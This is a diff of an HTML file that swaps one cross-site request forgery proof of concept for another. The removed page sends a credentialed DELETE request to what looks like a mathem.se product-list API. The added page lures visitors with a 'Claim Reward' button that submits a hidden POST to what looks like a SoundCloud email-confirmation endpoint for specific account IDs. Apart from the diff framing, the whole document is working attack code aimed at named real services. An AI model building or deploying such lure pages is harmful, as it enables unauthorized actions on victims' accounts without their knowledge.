@@ -1,42 +1,14 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>CSRF PoC DELETE with fetch</title>
-</head>
-<body>
+<!-- csrf-button-poc.html -->
+<html>
+  <body>
+    <h2>Click the button below to get a free feature!</h2>
 
-<h2>CSRF PoC - DELETE request</h2>
+    <form action="https://api-v2.soundcloud.com/users/1417348911/emails/1582294131/confirmation" method="POST" id="csrfForm">
+      <!-- Add hidden inputs here if the endpoint expects any -->
+    </form>
 
-<button id="csrfBtn">Submit CSRF DELETE</button>
-
-<p id="status"></p>
-
-<script>
-  const btn = document.getElementById('csrfBtn');
-  const status = document.getElementById('status');
-
-  btn.addEventListener('click', () => {
-    fetch('https://www.mathem.se/tienda-web-api/v1/product-lists/617528/', {
-      method: 'DELETE',
-      credentials: 'include', // send cookies
-      headers: {
-        // Add headers if necessary
-      }
-    })
-    .then(response => {
-      status.textContent = `Response status: ${response.status}`;
-      return response.text();
-    })
-    .then(text => {
-      console.log('Response body:', text);
-    })
-    .catch(err => {
-      status.textContent = `Error: ${err}`;
-      console.error('Fetch error:', err);
-    });
-  });
-</script>
-
-</body>
+    <button onclick="document.getElementById('csrfForm').submit();">
+      Claim Reward
+    </button>
+  </body>
 </html>
